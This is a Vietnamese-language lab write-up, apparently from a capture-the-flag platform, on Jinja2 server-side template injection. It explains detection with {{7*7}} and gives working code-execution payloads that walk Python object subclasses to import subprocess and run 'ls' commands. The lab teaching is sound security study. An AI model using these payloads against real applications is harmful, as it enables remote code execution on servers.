Jinja2 là một công cụ tạo mẫu phổ biến cho Python, nổi tiếng về tính linh hoạt và hiệu suất. Nó được sử dụng rộng rãi trong các ứng dụng web để hiển thị nội dung động, vì nó cho phép nhúng các biểu thức giống Python vào HTML. Mặc dù Jinja2 giúp tăng tốc quá trình phát triển và tạo điều kiện thuận lợi cho việc tách biệt phần trình bày khỏi logic nghiệp vụ, nhưng khả năng tạo mẫu mạnh mẽ của nó cũng có thể gây ra những rủi ro bảo mật đáng kể nếu không được xử lý đúng cách.

Vì Jinja2 cho phép thực thi các biểu thức Python bên trong các mẫu, rủi ro bảo mật trong Jinja2 thường phát sinh từ các thực tiễn lập trình không an toàn cho phép thực thi dữ liệu đầu vào của người dùng bên trong các mẫu mà không được xử lý đúng cách. Lỗ hổng không nằm ở bản thân Jinja2 mà nằm ở cách các nhà phát triển xử lý dữ liệu đầu vào của người dùng trong các mẫu của họ. Việc xử lý và xác thực đúng cách tất cả dữ liệu đầu vào của người dùng trước khi đưa chúng vào các mẫu là điều cần thiết để ngăn chặn các vấn đề bảo mật như vậy.

Các điểm dễ bị tổn thương chính:

1. Đánh giá biểu thức : Jinja2 đánh giá các biểu thức bên trong dấu ngoặc nhọn `{{ }}`, điều này có thể thực thi mã Python tùy ý nếu được tạo ra một cách độc hại.
2. Kế thừa mẫu và nhập khẩu : Các tính năng nâng cao như kế thừa mẫu và nhập khẩu macro có thể bị lạm dụng để thực thi mã không mong muốn, dẫn đến rò rỉ thông tin hoặc thao túng máy chủ.

EXPLOITATION 

Trước khi tạo payload, điều quan trọng là phải xác nhận rằng ứng dụng thực sự sử dụng Jinja2. Ví dụ, hãy truy cập http://ssti.thm:8002/jinja2/(mở trong tab mới).

Chèn một cú pháp Jinja2 cơ bản `{{7*7}}` để kiểm tra quá trình xử lý mẫu. Nếu ứng dụng trả về 49, điều đó cho thấy Jinja2 đang xử lý mẫu.

<img width="2396" height="754" alt="image" src="https://github.com/user-attachments/assets/3a23d9ac-6b0e-4514-a110-e227910692bf" />

Sau khi việc sử dụng Jinja2 được xác nhận, chúng ta có thể sử dụng payload.`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`

Dưới đây là chi tiết về tải trọng đã nêu ở trên:

1. `"".__class__.__mro__[1]` Truy cập vào lớp cơ sở `object`, lớp cha của tất cả các lớp Python.
2. `__subclasses__()`: Liệt kê tất cả các lớp con của `object`, và `[157]` thường là chỉ số của `subprocess.Popen` lớp (chỉ số này có thể thay đổi và cần được kiểm tra trong môi trường mục tiêu).

<img width="2418" height="968" alt="image" src="https://github.com/user-attachments/assets/3ed22d90-1cc2-41f3-bf33-93c8922c16a7" />

<img width="2680" height="596" alt="image" src="https://github.com/user-attachments/assets/c66ecf77-cb7e-4b86-bc89-f03fce24b1b9" />

Các chuỗi phương thức tiếp theo nhập động và sử dụng `subprocess` mô-đun để thực thi `ls` lệnh, thu thập kết quả đầu ra của nó.

<img width="2446" height="868" alt="image" src="https://github.com/user-attachments/assets/fd100b59-1169-48b8-abfc-0379ffcf13ce" />

Tại sao hàm `check_output('ls -lah')` không hoạt động?

Khi bạn sử dụng `check_output('ls -lah')`, bạn đang truyền toàn bộ lệnh và các đối số của nó dưới dạng một chuỗi duy nhất. Đây không phải là cách được khuyến nghị sử dụng check_outputvì nó không phân tích chuỗi thành lệnh và các đối số riêng biệt. Thay vào đó, nó coi toàn bộ chuỗi là một lệnh duy nhất để thực thi, mà nó không thể nhận dạng là một tệp thực thi hợp lệ và do đó không thể chạy.

Phương pháp truyền tham số này có thể dẫn đến các lỗ hổng tấn công chèn mã độc vào shell nếu các chuỗi do người dùng kiểm soát được nối trực tiếp vào chuỗi lệnh. Bằng cách yêu cầu các lệnh và tham số của chúng được truyền dưới dạng danh sách, check_outputrủi ro này được giảm thiểu.

Hiểu cách sử dụng check_output

Chức năng này `check_output` được thiết kế để tăng cường bảo mật bằng cách tách lệnh khỏi các đối số của nó, giúp ngăn chặn các cuộc tấn công chèn mã độc vào shell. Sau đây là cú pháp tổng quát:

`subprocess.check_output([command, arg1, arg2])`

1. command : Một chuỗi ký tự chỉ định lệnh cần thực thi.
2. arg1, arg2, ... : Các đối số bổ sung cần được truyền cho lệnh.

Cách sử dụng chính xác hàm check_output

Để thực thi `ls` lệnh đúng cách với các tùy chọn sử dụng `check_output`, bạn nên truyền lệnh và các đối số của nó dưới dạng các phần tử riêng biệt trong một danh sách:

`subprocess.check_output(['ls', '-lah'])`

Danh sách `['ls', '-lah']` chứa lệnh `ls` và đối số của nó -lah. Lệnh được tách biệt rõ ràng khỏi các đối số, đảm bảo rằng mỗi phần được xử lý chính xác như dự định. Vì vậy, tải trọng cuối cùng sẽ là `{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}`

<img width="2442" height="890" alt="image" src="https://github.com/user-attachments/assets/d582461e-944d-4f15-8e21-a36399b09818" />


